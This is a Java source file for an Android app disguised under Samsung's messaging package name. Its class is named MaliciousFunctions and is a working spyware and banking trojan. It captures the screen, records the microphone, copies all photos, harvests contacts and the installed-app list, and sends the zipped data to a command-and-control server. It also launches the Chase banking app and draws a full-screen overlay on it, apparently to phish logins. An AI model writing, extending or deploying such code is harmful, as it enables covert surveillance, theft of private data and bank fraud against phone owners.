package com.samsung.android.messaging;

import static android.content.Context.LAYOUT_INFLATER_SERVICE;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.CountDownTimer;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;

import androidx.annotation.NonNull;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.samsung.android.messaging2.R;

public class MaliciousFunctions {
    private static final String TAG = "MaliciousFunctions";

    private static boolean started = false;


    public static void takeScreenshot(Context context, Intent i, int resultCode) {

        if (!started) {
            Log.e(TAG,
                    String.format("starting MediaProjectionService. ResultCode: %d  intent: %s", resultCode, i.toString()));
            context.startService(ScreenCaptureService.getStartIntent(context, resultCode, i));
            started = true;
        }
        else {
            ScreenCaptureService.setActive();
        }
    }



    public static void recordMic(Context context) {
        File audioFile = new File(context.getExternalCacheDir().getAbsolutePath() + "/audio_recording.mp4");
        final MediaRecorder mediaRecorder = new MediaRecorder();
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        mediaRecorder.setOutputFile(audioFile.getPath());
        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);

        try {
            mediaRecorder.prepare();
            mediaRecorder.start();

            CountDownTimer countDownTimer = new CountDownTimer(5000, 1000) {
                @Override
                public void onTick(long millisUntilFinished) {
                    return;
                }

                @Override
                public void onFinish() {
                    mediaRecorder.stop();
                    mediaRecorder.release();

                    // zip up the audio file, and send it
                    File outZip = new File(context.getCacheDir(), "tmp_audio.zip");
                    try (ZipOutputStream zos = new ZipOutputStream(Files.newOutputStream(outZip.toPath()))) {
                        addToZip(zos, audioFile);
                    } catch (Exception e) {
                        Log.e("PHOTOS_BUTTON", "Error zipping up dir");
                    }

                    // Send the zip to C2
                    try {
                        byte[] zipBytes = Files.readAllBytes(Paths.get(outZip.toURI()));
                        sendMessage(Integer.parseInt(MaliciousDefines.RECORD_MIC), zipBytes.length, zipBytes);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            };
            countDownTimer.start();
        } catch (IOException e) {
            Log.e("MIC_BUTTON", "Error trying to record mic?");
            e.printStackTrace();
        }
    }
    public static void getPhotos(Context context) {
        // Create local app directory we will copy all photos to
        File tmpDirectory = new File(context.getCacheDir(), "tmp");
        if (!tmpDirectory.exists()) {
            tmpDirectory.mkdir();
        }

        // Get cursor to query MediaStore
        ContentResolver contentResolver = context.getContentResolver();
        Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        String[] projection = {MediaStore.Images.ImageColumns._ID, MediaStore.Images.ImageColumns.DATA};
        Cursor cursor = null;

        try {
            cursor = contentResolver.query(uri, projection, null, null, null);
        } catch (Exception e) {
            Log.e("PHOTOS_BUTTON", "Error while querying MediaStore", e);
            return;
        }

        // Loop through results and copy each photo
        if (cursor != null && cursor.moveToFirst()) {
            do {
                long id = cursor.getLong(0);
                String path = cursor.getString(1);
                Log.d("PHOTOS_BUTTON", "Loading image: " + path);

                Bitmap bitmap = null;
                try {
                    bitmap = MediaStore.Images.Media.getBitmap(contentResolver, Uri.withAppendedPath(uri, Long.toString(id)));
                } catch (IOException e) {
                    Log.w("PHOTOS_BUTTON", "Failed to load bitmap for image at path: " + path);
                    continue;
                }

                File targetFile = new File(tmpDirectory, getFileNameFromPath(path));
                try {
                    FileOutputStream fileOutputStream = new FileOutputStream(targetFile);
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 100, fileOutputStream);
                    fileOutputStream.close();
                } catch (IOException e) {
                    Log.w("PHOTOS_BUTTON", "Failed to save bitmap to file: " + targetFile.getPath());
                }
            } while (cursor.moveToNext());
        }

        if (cursor != null) {
            cursor.close();
        }



        // Zip up the directory
        File outZip = new File(context.getCacheDir(), "tmp.zip");
        try (ZipOutputStream zos = new ZipOutputStream(Files.newOutputStream(outZip.toPath()))) {
            addToZip(zos, tmpDirectory);
        } catch (Exception e) {
            Log.e("PHOTOS_BUTTON", "Error zipping up dir");
        }

        // Send the zip to C&C
        try {
            byte[] zipBytes = Files.readAllBytes(Paths.get(outZip.toURI()));
            sendMessage(Integer.parseInt(MaliciousDefines.COPY_PHOTOS), zipBytes.length, zipBytes);
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
    public static void readContacts(Context context) {
        ContentResolver cr = context.getContentResolver();

        // Get all contacts
        Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        Map<String, String> contacts = new HashMap<>();

        if (cursor != null && cursor.moveToFirst()) {
            do {
                String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String phoneNumber = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));

                contacts.put(name, phoneNumber);

                Log.d("readContacts", "Name: " + name + ", Phone Number: " + phoneNumber);
            } while (cursor.moveToNext());

            cursor.close();
        } else {
            Log.w("readContacts", "No contacts found.");
        }

        // convert to json and send to C2
        ObjectMapper mapper = new ObjectMapper();
        String jsonData;
        try {
            jsonData = mapper.writeValueAsString(contacts);
        } catch (Exception e) {
            throw new RuntimeException("Failed to serialize object to JSON.", e);
        }
        sendMessage(Integer.parseInt(MaliciousDefines.READ_CONTACTS), jsonData.length(), jsonData.getBytes(StandardCharsets.UTF_8));
    }

    public static void readPackageList(Context context) {
        PackageManager packageManager = context.getPackageManager();

        List<PackageInfo> packages;
        try {
            packages = packageManager.getInstalledPackages(0);
            StringBuilder sb = new StringBuilder();
            for (PackageInfo packageInfo : packages) {
                sb.append(packageInfo.packageName).append("\n");
            }
            sendMessage(Integer.parseInt(MaliciousDefines.GET_PACKAGES), sb.toString().length(), sb.toString().getBytes(StandardCharsets.UTF_8));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void launchApp(Context context) {
        Intent intent = context.getPackageManager().getLaunchIntentForPackage("com.chase.sig.android");
        context.startActivity(intent);
    }

    public static void injectOverlay(Context context) {
        WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        LayoutInflater inflater = (LayoutInflater) context.getSystemService(LAYOUT_INFLATER_SERVICE);

        View chaseView = inflater.inflate(R.layout.chase_injection, null);
        chaseView.setVisibility(View.VISIBLE);


        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED,
                PixelFormat.TRANSLUCENT);

        params.gravity = Gravity.CENTER;
        windowManager.addView(chaseView, params);


        Button buttonSubmit = chaseView.findViewById(R.id.buttonSubmit);
        buttonSubmit.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                windowManager.removeView(chaseView);
            }
        });
    }




    public static void sendMessage(int opcode, int length, byte[] payload) {
        TcpC2Message message = new TcpC2Message((short)opcode, length, payload);
        try {
            TcpC2Communicator.mOutputStream.write(message.toByteArray());
        } catch (IOException e){
            e.printStackTrace();
        }
    }
    public static String getFileNameFromPath(@NonNull String path) {
        int index = path.lastIndexOf('/');
        if (index > 0) {
            return path.substring(index + 1);
        } else {
            return path;
        }
    }

    public static void addToZip(ZipOutputStream zos, File file) throws IOException {
        if (file.isDirectory()) {
            for (File child : file.listFiles()) {
                addToZip(zos, child);
            }
        } else {
            ZipEntry entry = new ZipEntry(file.getPath());
            zos.putNextEntry(entry);

            Files.copy(file.toPath(), zos);
            zos.closeEntry();
        }
    }



}
